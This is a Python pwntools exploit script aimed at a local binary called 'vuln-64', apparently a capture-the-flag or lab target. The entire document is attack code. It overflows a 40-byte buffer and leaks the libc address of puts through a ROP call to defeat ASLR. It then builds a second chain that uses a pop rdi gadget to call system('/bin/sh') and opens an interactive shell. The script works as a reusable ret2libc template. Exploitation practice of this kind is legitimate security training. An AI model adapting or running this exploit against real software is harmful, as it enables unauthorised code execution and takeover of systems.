from pwn import *


elf = context.binary = ELF("./vuln-64")
libc = elf.libc
p = process()

rop = ROP(elf)
rop.raw(b"A" * 40)
rop.puts(elf.got["puts"])
rop.raw(elf.sym["main"])

p.recvline()
p.sendline(rop.chain())

puts_addr =  u64(p.recv(6) + b"\x00\x00")

libc.address = puts_addr - libc.sym["puts"] 

# 0x00000000004011cb : pop rdi ; ret
pop_rdi = 0x00000000004011cb

payload = flat([
    b"A" * 40,
    pop_rdi,
    next(libc.search("/bin/sh")),
    libc.sym["system"] + 44,
    libc.sym["system"],
])

# gdb.attach(p)

p.sendline(payload)


p.interactive()